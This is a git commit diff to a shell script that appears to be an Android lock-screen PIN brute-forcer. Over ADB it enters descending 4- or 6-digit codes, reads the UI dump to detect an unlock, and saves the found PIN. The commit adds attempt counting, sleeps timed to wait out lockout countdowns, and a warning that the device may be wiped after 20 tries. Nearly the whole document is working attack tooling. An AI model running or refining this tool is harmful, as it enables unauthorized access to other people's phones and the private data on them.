d21efac1fba10c86133b16e73477a0969903efbf
ArastaD0t <38872983+ArastaD0t@users.noreply.github.com>
2022-03-26 23:32:23 +0000

    Add files via upload

--- main.sh
+++ main.sh
@@ -6,7 +6,7 @@ alias Enter='adb shell input keyevent 66'
 alias EnterPass='adb shell input keyevent 82'
 #############################################
 echo "#############################"
-echo " Yours device can be erased  "
+echo "\Yours device can be erased/ "
 echo "#############################"
 echo "\# You haven  been warned #/ "
 echo " \#   Enter  to continue #/  "
@@ -23,8 +23,8 @@ echo "           \#  #/            "
 echo "            \##/             "
 echo ""
 echo "            @@@@             "
-echo "           @    @            "
-echo "           @    @            "
+echo "           @****@            "
+echo "           @****@            "
 echo "            @@@@             "
 read z
 echo "     You agree with risk     "
@@ -40,10 +40,10 @@ echo "        Lets rock it !       "
 #clear
 #echo "[ADB] Waiting for device.."
 #sleep 1
-#clear 
+#clear
 #echo "[ADB] Waiting for device."
 #sleep 1
-#clear 
+#clear
 #Connected=$(adb devices |grep -m2 "device" |tail -n1|cut -c 10-16)
 #done
 #echo "[ADB] Connected !"
@@ -62,6 +62,8 @@ echo "  3) 4-Digits WUC  ( Without Unlock Check: good for custom roms) "
 echo "  4) 6-Digits WUC  ( Without Unlock Check: good for custom roms) "
 echo "  5) Quit"
 
+att=1
+
 read selected
 clear
 case $selected in
@@ -75,19 +77,20 @@ if [ True ]
 then
    while [ True ];
 		do
-		gen=$(($gen-1)) 
+		gen=$(($gen-1))
 		echo "[APC] trying $gen"
 		Text $gen
 		Enter
                 adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
 		if cat /tmp/view.xml  |grep -q "Pin"
-                then echo ""
+                then echo "[APC] Attemp number $att"
                 else 
-                   echo "[APC] UNLOCKED with $gen !" 
+                   echo "[APC] UNLOCKED with $gen attemp $att !" 
                    touch  $gen.is.pin
                    adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
                    break
                 fi
+		att=$(($att+1))
 
 done
 fi
@@ -95,28 +98,47 @@ fi
 	;;
   2) 
 	echo "[APC] selected 6-Digits mode"
-	gen=999999
+	gen=1000000
 	EnterPass
 
 if [ True ]
 then
    while [ True ];
                 do
+		if [ "$att" = "6" ]; then
+		echo "[APC] First countdown 1m3s"
+                sleep 63
+		ScreenOn
+		EnterPass
+		if [ "$att" = "8" ]; then
+                echo "[APC] Second countdown 10m"
+                sleep 608
+                ScreenOn
+                EnterPass
+                fi 
+
+		fi
+		if [ "$att" = "20" ]; then
+		echo "                                                                                       "
+		echo "! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! !"
+                echo "[APC] ! WARNING ! YOU RECHED 20th Attemp ! IF U CONTINUE , YOURS DEVICE CAN BE ERASED !"
+		echo "! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! ! !"
+		echo "          You have be warned !  pres ENTER to continue or CTRL C to exit               "
+		fi
                 gen=$(($gen-1)) 
-		echo "[APC] Trying $gen"
+		echo "[APC] Trying $gen attemp $att"
                 Text $gen
                 Enter
 		adb pull $(adb shell uiautomator dump | grep -oP '[^ ]+.xml') /tmp/view.xml >&-
 		if cat /tmp/view.xml  |grep -q "Pin" 
                 then echo ""
                 else 
-		   echo "[APC] UNLOCKED with $gen !" 
+		   echo "[APC] UNLOCKED with $gen $att !" 
 		   touch  $gen.is.pin
 		   adb shell "rm /sdcard/window_dump.xml" & rm /tmp/view.xml >&-
 	  	   break
                 fi
- 
-
+ 		att=$(($att + 1))
 done
 fi  
 
@@ -126,7 +148,7 @@ fi
 	;;
   3)
 	echo "[APC] selected 4-Digits WUC mode"
-	gen=9999
+	gen=10000
 	EnterPass
 
 
@@ -136,10 +158,11 @@ then
 		do
     echo "[APC] You must check screen yourself..."
 		gen=$(($gen-1)) 
-		echo "[APC] trying $gen"
+		echo "[APC] trying $gen attemp $att"
 		Text $gen
 		Enter
     sleep 3
+    att=$(($att + 1))
 done
 fi
 
@@ -155,10 +178,11 @@ then
                 do
                 echo "[APC] You must check screen yourself..."
                 gen=$(($gen-1)) 
-		echo "[APC] Trying $gen"
+		echo "[APC] Trying $gen attemp $att"
                 Text $gen
                 Enter
                 sleep 3
+		att=$(($att + 1))
 done
 fi  
 
